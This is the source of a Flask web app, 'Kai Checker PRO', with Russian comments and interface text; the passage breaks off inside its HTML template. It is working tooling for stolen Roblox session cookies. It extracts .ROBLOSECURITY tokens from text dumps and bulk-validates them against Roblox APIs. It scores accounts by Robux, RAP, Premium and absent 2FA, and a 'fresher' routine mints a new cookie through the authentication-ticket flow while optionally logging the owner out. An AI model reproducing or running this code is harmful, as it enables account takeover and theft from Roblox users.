import os
import time
import logging
import re
import urllib3
import json
import io
import zipfile
import uuid
import sqlite3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session

# ==========================================
# ИНИЦИАЛИЗАЦИЯ
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
DB_PATH = "data.db"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE,
                    username TEXT,
                    created_at TEXT,
                    xp INTEGER DEFAULT 0,
                    level INTEGER DEFAULT 1,
                    balance INTEGER DEFAULT 0,
                    checks_count INTEGER DEFAULT 0,
                    cookies_found INTEGER DEFAULT 0,
                    premium_found INTEGER DEFAULT 0,
                    rap_found INTEGER DEFAULT 0
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS checker_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    timestamp TEXT,
                    type TEXT,
                    total INTEGER,
                    valid INTEGER,
                    results TEXT
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS fresher_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    timestamp TEXT,
                    refreshed_count INTEGER,
                    cookies TEXT
                )''')
    
    conn.commit()
    conn.close()

init_db()

# ==========================================
# РАБОТА С ПОЛЬЗОВАТЕЛЕМ
# ==========================================
def get_user():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
        session['username'] = f"User_{session['user_id'][:6]}"
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO users (session_id, username, created_at) VALUES (?, ?, ?)",
                  (session['user_id'], session['username'], datetime.now().strftime('%d.%m.%Y')))
        conn.commit()
        conn.close()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, username, xp, level, balance, checks_count, cookies_found, premium_found, rap_found FROM users WHERE session_id=?", (session['user_id'],))
    row = c.fetchone()
    conn.close()
    
    if row:
        return {
            'id': row[0], 'username': row[1], 'xp': row[2], 'level': row[3],
            'balance': row[4], 'checks_count': row[5], 'cookies_found': row[6],
            'premium_found': row[7], 'rap_found': row[8]
        }
    return None

def update_user_stats(session_id, checks=0, valid=0, premium=0, rap=0):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""UPDATE users SET 
                 checks_count = checks_count + ?,
                 cookies_found = cookies_found + ?,
                 premium_found = premium_found + ?,
                 rap_found = rap_found + ?,
                 xp = xp + ?
                 WHERE session_id = ?""", 
              (checks, valid, 1 if premium else 0, 1 if rap > 5000 else 0, checks * 10, session_id))
    conn.commit()
    conn.close()

def get_achievements(user):
    achievements = []
    
    if user['checks_count'] >= 1:
        achievements.append({'icon': '🛒', 'name': 'Первая проверка', 'xp': '+50 XP', 'unlocked': True})
    if user['checks_count'] >= 10:
        achievements.append({'icon': '🔍', 'name': 'Исследователь', 'xp': '+100 XP', 'unlocked': True})
    if user['checks_count'] >= 50:
        achievements.append({'icon': '⚡', 'name': 'Скорость', 'xp': '+300 XP', 'unlocked': True})
    if user['checks_count'] >= 100:
        achievements.append({'icon': '🏆', 'name': 'Профи', 'xp': '+2000 XP', 'unlocked': True})
    if user['cookies_found'] >= 5:
        achievements.append({'icon': '🚀', 'name': 'Массовик', 'xp': '+200 XP', 'unlocked': True})
    if user['rap_found'] >= 1:
        achievements.append({'icon': '💎', 'name': 'Коллекционер', 'xp': '+500 XP', 'unlocked': True})
    if user['premium_found'] >= 1:
        achievements.append({'icon': '👑', 'name': 'Охотник за сокровищами', 'xp': '+1000 XP', 'unlocked': True})
    
    return achievements

# ==========================================
# ЧЕКЕР (ПОЛНАЯ ВЕРСИЯ)
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_user_rap(session, user_id):
    try:
        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json().get('data', [])
            val = sum(item.get('recentAveragePrice', 0) for item in data)
            return val if val > 0 else None
    except: pass
    return None

def get_user_playtime(session, user_id):
    try:
        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            seconds = data.get('totalPlayTimeSeconds', 0)
            if seconds > 0: return round(seconds / 3600, 1)
    except: pass
    return None

def get_full_info(cookie):
    info = {
        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
        'IsPremium':False, 'DonationTotal':0
    }
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json'})

        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=12, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=8)
                return r.json() if r.status_code == 200 else {}
            except: return {}

        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        
        info['RAP'] = get_user_rap(s, uid)
        info['PlaytimeHours'] = get_user_playtime(s, uid)

        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')

        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {
        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
        'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
        'cookie':cookie, 'score':0, 'full_info': None
    }
    info = get_full_info(cookie)
    if info['status'] == '✅':
        result['status'] = '✅'; result['username'] = info['Username']; result['user_id'] = info['UserID']
        result['robux'] = info['Robux']; result['rap'] = info['RAP']; result['playtime'] = info['PlaytimeHours']
        result['created'] = info['Created']; result['is_premium'] = info['IsPremium']
        result['has_email'] = info['EmailSet']; result['has_2fa'] = info['TwoFactorEnabled']
        result['full_info'] = info
        score = 0
        if info['Robux'] >= 10000: score += 100
        elif info['Robux'] >= 1000: score += 50
        elif info['Robux'] > 0: score += 10
        if info['RAP'] and info['RAP'] > 5000: score += 50
        if info['IsPremium']: score += 50
        if info['EmailSet']: score += 15
        if info['TwoFactorEnabled']: score += 10
        result['score'] = score
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + results

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
    r += f"💸 Донат: ⏣ {info['DonationTotal']:,} | ⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
        play_str = f"{result['playtime']}h" if result['playtime'] is not None else "⏱️ ❌"
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | {play_str} | S:{score} {' '.join(badges)}"
    return f"❌ НЕВАЛИД"

# ==========================================
# ФРЕШЕР (MEOW TOOLS)
# ==========================================
def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

# ==========================================
# ИНСТРУМЕНТЫ
# ==========================================
def merge_cookie_files(contents):
    all_cookies = []
    for c in contents:
        extracted = extract_cookies_from_text(c)
        all_cookies.extend(extracted)
    unique = list(dict.fromkeys(all_cookies))
    return '\n'.join(unique)

def remove_duplicates(content):
    cookies = extract_cookies_from_text(content)
    return '\n'.join(cookies)

# ==========================================
# FLASK APP
# ==========================================
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "kai_checker_secret_2026")

# ==========================================
# HTML (ПОЛНЫЙ КРАСИВЫЙ ИНТЕРФЕЙС + ПРОФИЛЬ)
# ==========================================
HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #07030d;
            --bg-card: rgba(23, 10, 38, 0.55);
            --border-card: rgba(168, 85, 247, 0.25);
            --border-hover: rgba(217, 70, 239, 0.6);
            --input-bg: rgba(12, 5, 20, 0.75);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-purple: #9333ea;
            --accent-pink: #c026d3;
            --accent-glow: rgba(168, 85, 247, 0.2);
            --gradient-primary: linear-gradient(135deg, #a855f7 0%, #d946ef 50%, #6366f1 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
            --avatar-border: #a855f7;
        }
        [data-theme="light"] {
            --bg: #f5f0ff;
            --bg-card: rgba(255, 255, 255, 0.75);
            --border-card: rgba(168, 85, 247, 0.2);
            --border-hover: rgba(168, 85, 247, 0.5);
            --input-bg: rgba(243, 232, 255, 0.6);
            --text-main: #2e1065;
            --text-muted: #7e22ce;
            --accent-purple: #7e22ce;
            --accent-pink: #c026d3;
            --accent-glow: rgba(126, 34, 206, 0.15);
            --avatar-border: #7e22ce;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            background: var(--bg);
            color: var(--text-main);
            position: relative;
            overflow-x: hidden;
            padding: 24px 16px;
        }

        #particles-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 0;
            pointer-events: none;
        }
        .bg-glow {
            position: fixed;
            width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%);
            top: -100px; left: 50%;
            transform: translateX(-50%);
            z-index: 0;
            pointer-events: none;
            animation: pulseGlow 8s infinite alternate ease-in-out;
        }
        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); opacity: 0.5; }
            100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; }
        }

        .wrapper {
            max-width: 1350px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
        }

        /* HEADER */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--border-card);
            margin-bottom: 28px;
            flex-wrap: wrap;
            gap: 16px;
        }
        .logo-wrap { display: flex; align-items: center; gap: 14px; }
        .logo-text {
            font-family: 'Paytone One', 'Rubik Puddles', cursive, sans-serif;
            font-size: 38px;
            font-weight: 900;
            letter-spacing: 1px;
            background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(217, 70, 239, 0.3);
            transform: skew(-4deg);
            display: inline-block;
        }
        .badge-pro {
            font-size: 11px; font-weight: 800;
            background: rgba(168, 85, 247, 0.15);
            color: var(--accent-pink);
            padding: 4px 12px; border-radius: 20px;
            border: 1px solid var(--border-card);
            letter-spacing: 1.5px;
        }

        .header-actions { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
        .theme-btn {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 30px; padding: 8px 16px; cursor: pointer;
            font-size: 14px; color: var(--text-main); font-weight: 700; transition: all 0.2s;
        }
        .theme-btn:hover { border-color: var(--accent-purple); }

        /* PROFILE WIDGET */
        .profile-widget { position: relative; }
        .profile-btn {
            background: rgba(25, 12, 42, 0.9); border: 1px solid rgba(168, 85, 247, 0.4);
            padding: 4px 16px 4px 4px; border-radius: 30px; display: flex; align-items: center; gap: 10px;
            cursor: pointer; transition: all 0.2s;
        }
        .profile-btn:hover { border-color: var(--accent-pink); }
        .avatar-img { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; border: 2px solid var(--avatar-border); }
        .profile-name { font-weight: 700; font-size: 14px; }
        .profile-level { font-size: 11px; background: var(--accent-purple); padding: 2px 8px; border-radius: 10px; color: #fff; font-weight: 700; }
        .dropdown-arrow { font-size: 10px; color: var(--text-muted); margin-left: 2px; }

        .profile-menu {
            position: absolute; right: 0; top: 48px; width: 250px;
            background: #120724; border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 20px; padding: 12px; display: none; flex-direction: column; gap: 4px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 100; backdrop-filter: blur(20px);
        }
        .profile-menu.show { display: flex; }
        .menu-item {
            display: flex; align-items: center; gap: 12px; padding: 10px 14px;
            border-radius: 12px; color: var(--text-main); text-decoration: none; font-size: 13px; font-weight: 600;
            transition: 0.2s; cursor: pointer;
        }
        .menu-item:hover { background: rgba(168, 85, 247, 0.15); }

        /* TABS */
        .tabs {
            display: flex; gap: 10px; margin-bottom: 24px;
            background: var(--input-bg); padding: 6px; border-radius: 16px;
            border: 1px solid var(--border-card); width: fit-content; flex-wrap: wrap;
            box-shadow: 0 8px 30px rgba(0,0,0,0.25);
        }
        .tab {
            padding: 12px 24px; border-radius: 12px; color: var(--text-muted); cursor: pointer;
            font-size: 14px; font-weight: 700; transition: all 0.3s;
            border: none; background: transparent;
        }
        .tab:hover { color: var(--text-main); background: rgba(168, 85, 247, 0.1); }
        .tab.active { background: var(--gradient-btn); color: #fff; box-shadow: 0 6px 18px var(--accent-glow); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* CARDS */
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            border-radius: 20px; padding: 24px;
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        .card:hover { border-color: var(--border-hover); box-shadow: 0 10px 25px var(--accent-glow); }
        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }

        /* BUTTONS */
        .btn {
            padding: 12px 24px; border: none; border-radius: 14px;
            font-size: 13px; font-weight: 700; cursor: pointer;
            color: #fff; display: inline-flex; align-items: center;
            justify-content: center; gap: 8px; text-decoration: none;
            transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .btn-primary { background: var(--gradient-btn); }
        .btn-primary:hover { background: var(--gradient-btn-hover); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }

        /* INPUTS */
        textarea, input[type="number"], input[type="text"] {
            width: 100%; padding: 14px;
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            border-radius: 14px; color: var(--text-main);
            font-family: monospace; font-size: 12px;
            transition: border-color 0.2s;
        }
        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 8px var(--accent-glow); }

        .upload-area {
            min-height: 110px; border: 2px dashed var(--border-card);
            border-radius: 16px; background: var(--input-bg);
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center;
            padding: 16px;
        }
        .upload-area:hover, .upload-area.drag-over {
            border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.05);
            box-shadow: 0 0 10px var(--accent-glow);
        }

        .result-container { margin-top: 16px; position: relative; }
        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
        .result-title { font-size: 12px; font-weight: 700; color: var(--text-muted); }
        .action-btn-group { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }

        .btn-toggle-box, .btn-download-txt, .btn-download-zip, .btn-download-csv {
            background: rgba(217, 70, 239, 0.15);
            border: 1px solid rgba(217, 70, 239, 0.3);
            color: var(--accent-pink);
            padding: 4px 12px; border-radius: 8px;
            font-size: 11px; font-weight: 600; cursor: pointer;
            transition: all 0.2s;
        }
        .btn-toggle-box:hover, .btn-download-txt:hover, .btn-download-zip:hover, .btn-download-csv:hover {
            background: rgba(217, 70, 239, 0.3);
            box-shadow: 0 0 8px var(--accent-glow);
        }

        .result-box {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 14px; padding: 14px;
            max-height: 400px; overflow-y: auto; font-family: monospace;
            font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all;
            margin-top: 6px;
        }

        .progress-bar { margin-top: 12px; background: var(--input-bg); border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card); }
        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }

        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .grid-2 { grid-template-columns: 1fr; } }

        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }

        /* FILTERS */
        .filters-bar {
            display: flex; gap: 12px; margin-top: 12px; flex-wrap: wrap; align-items: center;
            background: var(--input-bg); padding: 12px 16px; border-radius: 14px; border: 1px solid var(--border-card);
        }
        .filter-group { display: flex; align-items: center; gap: 6px; }
        .filter-group label { font-size: 12px; font-weight: 700; color: var(--text-muted); white-space: nowrap; }
        .filter-group input[type="number"] { width: 70px; padding: 6px 8px; background: var(--bg); border: 1px solid var(--border-card); border-radius: 8px; color: var(--text-main); font-size: 12px; }
        .filter-group input[type="checkbox"] { width: 16px; height: 16px; accent-color: #a855f7; }
        .filter-group select { padding: 6px 10px; background: var(--bg); border: 1px solid var(--border-card); border-radius: 8px; color: var(--text-main); font-size: 12px; }

        /* HISTORY */
        .history-card { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 16px; padding: 16px; margin-bottom: 14px; }
        .history-header { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 700; color: var(--accent-pink); flex-wrap: wrap; gap: 8px; }

        /* PROFILE PAGE */
        .profile-header-card {
            background: rgba(17, 6, 36, 0.8); border: 1px solid var(--border-card); border-radius: 24px;
            padding: 24px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; flex-wrap: wrap; gap: 20px;
        }
        .user-main { display: flex; align-items: center; gap: 20px; }
        .big-avatar { width: 72px; height: 72px; border-radius: 50%; border: 3px solid var(--avatar-border); object-fit: cover; }
        .user-titles h1 { font-size: 22px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .level-badge { background: var(--gradient-btn); font-size: 11px; padding: 2px 12px; border-radius: 12px; font-weight: 700; color: #fff; }
        .user-email { color: var(--text-muted); font-size: 13px; margin-top: 4px; }
        .xp-bar-wrap { width: 220px; margin-top: 10px; }
        .xp-text { font-size: 11px; color: var(--text-muted); margin-top: 4px; }
        .xp-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .xp-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.5s; }

        .user-stats-top { display: flex; gap: 30px; text-align: right; }
        .stat-item .val { font-size: 20px; font-weight: 800; color: #fff; }
        .stat-item .lbl { font-size: 10px; color: var(--text-muted); text-transform: uppercase; margin-top: 2px; }

        .profile-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
        @media(max-width:1000px){ .profile-grid { grid-template-columns: 1fr; } }

        .achieve-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; margin-top: 12px; }
        .achieve-card { background: rgba(18, 7, 36, 0.6); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; text-align: center; }
        .achieve-card .icon { font-size: 28px; margin-bottom: 6px; }
        .achieve-card .title { font-size: 12px; font-weight: 700; }
        .achieve-card .xp { font-size: 10px; color: var(--accent-pink); margin-top: 2px; }
        .achieve-card.locked { opacity: 0.4; filter: grayscale(1); }

        .ref-box { background: rgba(12, 5, 22, 0.8); border: 1px solid var(--border-card); border-radius: 14px; padding: 12px; display: flex; gap: 10px; margin-top: 10px; }
        .ref-box input { border: none; background: transparent; padding: 0; font-size: 12px; color: var(--text-main); width: 100%; }

        /* ALERT */
        .custom-alert-overlay { position: fixed; top: 24px; right: 24px; z-index: 99999; pointer-events: none; }
        .custom-alert-card { pointer-events: auto; background: rgba(23,10,38,0.95); border: 1px solid var(--border-hover); box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 15px var(--accent-glow); backdrop-filter: blur(12px); border-radius: 16px; padding: 14px 20px; display: flex; align-items: center; gap: 12px; min-width: 280px; max-width: 360px; transform: translateY(-20px) scale(0.95); opacity: 0; transition: all 0.3s cubic-bezier(0.175,0.885,0.32,1.275); }
        .custom-alert-overlay.show .custom-alert-card { transform: translateY(0) scale(1); opacity: 1; }
        .alert-icon { font-size: 22px; line-height: 1; }
        .alert-body { display: flex; flex-direction: column; gap: 2px; flex-grow: 1; }
        .alert-body h3 { margin: 0; color: #fff; font-size: 13px; font-weight: 700; }
        .alert-body p { color: var(--text-muted); font-size: 12px; margin: 0; word-break: break-word; font-weight: 500; }
        .alert-close-btn { background: transparent; border: none; color: var(--text-muted); font-size: 16px; cursor: pointer; padding: 4px; line-height: 1; transition: color 0.2s; }
        .alert-close-btn:hover { color: #fff; }

        .footer { text-align: center; padding-top: 20px; color: var(--text-muted); font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px; }
    </style>
</head>
<body>

<canvas id="particles-canvas"></canvas>
<div class="bg-glow"></div>

<div id="custom-alert" class="custom-alert-overlay">
    <div class="custom-alert-card">
        <div class="alert-icon">⚠️</div>
        <div class="alert-body"><h3>Внимание</h3><p id="custom-alert-msg">Вставьте кук!</p></div>
        <button class="alert-close-btn" onclick="closeAlert()">✕</button>
    </div>
</div>

<div class="wrapper">
    <!-- HEADER -->
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-text">KAI CHECKER</div>
            <span class="badge-pro">PRO EDITION</span>
        </div>
        <div class="header-actions">
            <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
            <div class="profile-widget">
                <div class="profile-btn" onclick="toggleProfileMenu()">
                    <img src="https://api.dicebear.com/7.x/bottts/svg?seed={{ username }}" class="avatar-img">
                    <span class="profile-name">{{ username }}</span>
                    <span class="profile-level">Ур. {{ user.level }}</span>
                    <span class="dropdown-arrow">▼</span>
                </div>
                <div class="profile-menu" id="profileMenu">
                    <div class="menu-item" onclick="activateTab('profile'); toggleProfileMenu();">👤 Мой профиль</div>
